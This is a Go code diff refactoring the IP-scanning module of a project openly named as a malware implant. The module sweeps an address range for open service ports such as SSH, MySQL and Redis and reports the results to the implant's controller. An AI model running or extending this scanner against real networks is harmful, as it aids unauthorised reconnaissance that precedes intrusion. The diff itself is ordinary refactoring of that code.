@@ -3,7 +3,6 @@ package ip_scan
 import (
 	"context"
 	"fmt"
-	"golang.org/x/sync/semaphore"
 	"malware/common/messages"
 	"malware/common/types"
 	"math"
@@ -12,12 +11,28 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"golang.org/x/sync/semaphore"
 )
 
+/**
+A slightly more complex module.
+
+This module has state. Since the settings struct is passed around by
+value and not by reference, we must keep inside of it a reference to
+a state struct which we can modify.
+
+Variables inside state will be used to hold mutable information about this
+module
+
+*/
+
+// Common ports
+var PORTS = []uint32{22, 23, 25, 53, 80, 443, 514, 5431, 3306, 6379, 9200, 9300, 8080, 8000}
+
 type state struct {
-	running  bool
-	scanning bool
-	lock     *semaphore.Weighted
+	scanning bool                // Whether or not a scan is currently running
+	lock     *semaphore.Weighted // Control how many scans can run at once
 }
 
 type settings struct {
@@ -26,11 +41,11 @@ type settings struct {
 
 // Create creates an implementation of settings
 func Create() types.Module {
-	state := state{running: false, scanning: false, lock: semaphore.NewWeighted(100)}
+	state := state{scanning: false, lock: semaphore.NewWeighted(100)}
 	return settings{&state}
 }
 
-func ScanPort(ip string, port int, timeout time.Duration) bool {
+func ScanPort(ip string, port uint32, timeout time.Duration) bool {
 	target := fmt.Sprintf("%s:%d", ip, port)
 	conn, err := net.DialTimeout("tcp", target, timeout)
 
@@ -71,19 +86,19 @@ func ip_range(ip string) (string, int) {
 	return ip_parts[0] + "." + ip_parts[1] + "." + ip_parts[2] + ".", int(math.Pow(float64(2), float64(32-bits)))
 }
 
-var ports = []int{22, 23, 25, 53, 80, 443, 514, 5431, 3306, 6379, 9200, 9300, 8080, 8000}
-
-func (settings settings) ip_scan(ipscan *messages.IPScan, callback func(*messages.ImplantReply)) {
+func (settings settings) ip_scan(ipscan *messages.IPScan, callback func(*messages.CheckCmdRequest)) {
 	if ipscan.Cancel {
 		settings.state.scanning = false
 	} else if settings.state.scanning {
-		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_IPSCAN_RUNNING})
+		callback(messages.Implant_error(settings.ID(), types.ERR_IPSCAN_RUNNING))
 	} else {
+		settings.state.scanning = true
 
 		wg := sync.WaitGroup{}
 		ip, bits := ip_range(ipscan.IpRange)
 		if bits == -1 {
-			callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_INVALID_RANGE_IPSCAN})
+			settings.state.scanning = false
+			callback(messages.Implant_error(settings.ID(), types.ERR_INVALID_RANGE_IPSCAN))
 			return
 		}
 
@@ -96,24 +111,24 @@ func (settings settings) ip_scan(ipscan *messages.IPScan, callback func(*message
 			go func(ip string) {
 				defer settings.state.lock.Release(1)
 				defer wg.Done()
-				for _, port := range ports {
+
+				for _, port := range PORTS {
 					if ScanPort(ip, port, time.Second/4) {
-						ipscan_reply := &messages.IPScanReply{Status: messages.IPScanReply_IN_PROGRESS, Ip: ip, Port: int32(port)}
-						callback(&messages.ImplantReply{Module: settings.ID(), Ipscan: ipscan_reply})
+						callback(messages.Implant_ipscan_in_progress(settings.ID(), ip, port))
 					}
 				}
-
 			}(ip)
 		}
 
+		// Wait for all threads to complete. ie: threads.join()
 		wg.Wait()
 
 		settings.state.scanning = false
-		callback(&messages.ImplantReply{Module: settings.ID(), Portscan: &messages.PortScanReply{Status: messages.PortScanReply_COMPLETE}})
+		callback(messages.Implant_ipscan_complete(settings.ID()))
 	}
 }
 
-func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
+func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
 	ipscan := message.GetIpScan()
 	if ipscan == nil {
 		return false
@@ -125,11 +140,8 @@ func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback
 
 // Init the state of this module
 func (settings settings) Init() {
-	settings.state.running = true
 }
-
 func (settings settings) Shutdown() {
-	settings.state.running = false
 }
 
 func (settings) ID() string { return "ipscan" }
